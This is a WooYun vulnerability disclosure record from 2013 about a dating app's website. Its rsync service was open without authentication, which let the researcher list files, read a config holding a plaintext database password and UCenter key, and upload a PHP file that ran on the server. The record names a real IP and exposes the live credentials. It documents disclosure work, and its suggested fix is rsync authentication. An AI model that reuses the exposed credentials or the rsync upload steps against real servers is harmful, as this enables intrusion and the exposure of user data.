{"id": 7610, "wybug_id": "wooyun-2013-041006", "wybug_title": "手机交友APP-情人结网站配置不当导致数据泄漏(可直接上传shell)", "wybug_corp": "情人结", "wybug_author": "盈盈无绪", "wybug_date": "2013-10-25 16:56", "wybug_open_date": "2013-12-09 16:57", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "服务配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-12-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rsync配置不当导致数据泄漏 详细说明：  118.144.94.98配置了rsync的服务，但是没有身份认证就可以直接访问。rsync 118.144.94.98::www尝试rsync网站内容到本地成功\nrsync 118.144.94.98::www/love/drwxrwxrwx        4096 2013/10/25 16:08:46 .-rwxr-xr-x        2596 2011/10/11 09:48:42 admin.php-rwxr-xr-x         741 2011/10/11 09:48:42 api.php-rwxr-xr-x         877 2011/10/11 09:48:42 connect.php-rwxr-xr-x         253 2011/10/11 09:48:42 cp.php-rwxr-xr-x         106 2011/10/11 09:48:42 crossdomain.xml-rwxr-xr-x        5558 2011/10/11 09:48:42 favicon.ico-rwxr-xr-x        2112 2011/10/11 09:48:42 forum.php-rwxr-xr-x         883 2011/10/11 09:48:42 group.php-rwxr-xr-x        1096 2011/10/11 09:48:42 home.php-rwxr-xr-x        5517 2011/10/11 09:48:42 index8.php-rwxr-xr-x         956 2011/10/11 09:48:42 member.php-rwxr-xr-x        1355 2011/10/11 09:48:42 misc.php-rwxr-xr-x        1731 2011/10/11 09:48:42 plugin.php-rwxr-xr-x        1077 2011/10/11 09:48:42 portal.php-rwxr-xr-x         582 2011/10/11 09:48:42 robots.txt-rwxr-xr-x        1192 2011/10/11 09:48:42 search.php-rwxr-xr-x        1706 2011/10/11 09:48:42 userapp.phpdrwxr-xr-x        4096 2011/12/02 15:42:36 apidrwxr-xr-x        4096 2011/12/02 15:42:36 archiverdrwxr-xr-x        4096 2011/12/02 15:44:56 configdrwxr-xr-x        4096 2011/12/04 19:46:44 datadrwxr-xr-x        4096 2011/12/02 16:11:56 installdrwxr-xr-x        4096 2013/10/25 16:08:09 iphonedrwxr-xr-x        4096 2012/07/11 18:51:06 mysqldrwxr-xr-x        4096 2011/12/02 15:42:36 sourcedrwxr-xr-x        4096 2011/12/02 15:42:36 staticdrwxr-xr-x        4096 2011/12/02 15:42:38 templatedrwxr-xr-x        4096 2011/12/02 15:42:40 uc_clientdrwxr-xr-x        4096 2011/12/02 15:42:40 uc_server\n发现有大量用户上传图片存放\nrsync  118.144.94.98::www/love/data/attachment/album/drwxr-xr-x        4096 2013/10/01 17:26:03 .-rwxr-xr-x           0 2011/10/11 09:48:42 index.htmdrwxr-xr-x        4096 2012/03/12 13:52:25 201203drwxr-xr-x        4096 2012/04/27 11:02:15 201204drwxr-xr-x        4096 2012/05/31 12:04:35 201205drwxr-xr-x        4096 2012/06/30 01:10:05 201206drwxr-xr-x        4096 2012/07/31 00:21:19 201207drwxr-xr-x        4096 2012/08/31 01:31:38 201208drwxr-xr-x        4096 2012/09/30 05:21:14 201209drwxr-xr-x        4096 2012/10/31 00:03:06 201210drwxr-xr-x        4096 2012/11/30 03:32:52 201211drwxr-xr-x        4096 2012/12/31 00:00:20 201212drwxr-xr-x        4096 2013/01/31 00:00:04 201301drwxr-xr-x        4096 2013/02/28 00:48:00 201302drwxr-xr-x        4096 2013/03/31 01:02:25 201303drwxr-xr-x        4096 2013/04/30 00:40:11 201304drwxr-xr-x        4096 2013/05/31 00:26:16 201305drwxr-xr-x        4096 2013/06/30 01:06:31 201306drwxr-xr-x        4096 2013/07/31 00:06:46 201307drwxr-xr-x        4096 2013/08/31 00:48:07 201308drwxr-xr-x        4096 2013/09/30 04:10:57 201309drwxr-xr-x        4096 2013/10/25 09:33:43 201310drwxr-xr-x        4096 2012/03/05 14:04:10 cover\n看配置文件发现数据库密码是adoado\n<?phpdefine('UC_CONNECT', 'mysql');define('UC_DBHOST', 'localhost');define('UC_DBUSER', 'love');define('UC_DBPW', 'adoado');define('UC_DBNAME', 'love');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', '`love`.pre_ucenter_');define('UC_DBCONNECT', 0);define('UC_CHARSET', 'utf-8');define('UC_KEY', '02EeJ5K2q7w775F8I91186tcz9fc9cE0Q0U9B19bQ0O8Vcg329a141b8R2x8Sf09');define('UC_API', 'http://api.qingrenjie.me:88/uc_server');define('UC_APPID', '1');define('UC_IP', '127.0.0.1');define('UC_PPP', 20);\n尝试用这个密码登陆UCenterUCenter 统计信息应用总数:2用户总数:59563短消息数:0好友记录数:30通过rsync上传env.php成功执行可见\nPHP Version 5.2.17p1System\tLinux SNDA-172-17-11-3 2.6.32-220.el6.x86_64 #1 SMP Tue Dec 6 19:48:22 GMT 2011 x86_64Build Date\tJul 11 2012 16:13:37Configure Command\t './configure' '--prefix=/usr/local/php' '--with-config-file-path=/usr/local/php/etc' '--with-apxs2=/usr/local/apache/bin/apxs' '--with-mysql=/usr/local/mysql' '--with-mysqli=/usr/local/mysql/bin/mysql_config' '--with-iconv-dir' '--with-freetype-dir' '--with-jpeg-dir' '--with-png-dir' '--with-zlib' '--with-libxml-dir=/usr' '--enable-xml' '--disable-rpath' '--enable-discard-path' '--enable-magic-quotes' '--enable-safe-mode' '--enable-bcmath' '--enable-shmop' '--enable-sysvsem' '--enable-inline-optimization' '--with-curl' '--with-curlwrappers' '--enable-mbregex' '--enable-mbstring' '--with-mcrypt' '--enable-ftp' '--with-gd' '--enable-gd-native-ttf' '--with-openssl' '--with-mhash' '--enable-pcntl' '--enable-sockets' '--with-xmlrpc' '--enable-zip' '--enable-soap' '--without-pear' '--with-gettext' '--with-mime-magic'Server API\tApache 2.0 HandlerVirtual Directory Support\tdisabledConfiguration File (php.ini) Path\t/usr/local/php/etcLoaded Configuration File\t/usr/local/php/etc/php.ini\n渗透结束   漏洞证明：  \n\n   修复方案：  rsync必须有身份认证   版权声明：转载请注明来源 盈盈无绪@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-01-17 13:59 |    \t\t坠落。 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | -.- 屌丝一枚,菜鸟一个,擅长windows/linux...)\t\t \n  节操何在    \n     2014-01-17 15:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我擦！！！！！！！！！！！！！！！！！！！！！我会叫人来围观的    \n     2014-01-17 15:51 |    \t\t阿布 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        )\t\t \n  卧槽！！！！！！！！！！！！！！！！！！！！！！！！！    \n     2014-01-17 16:49 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  卧槽！！！！！！！！！！！！！！！！！！！！！！！！！     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}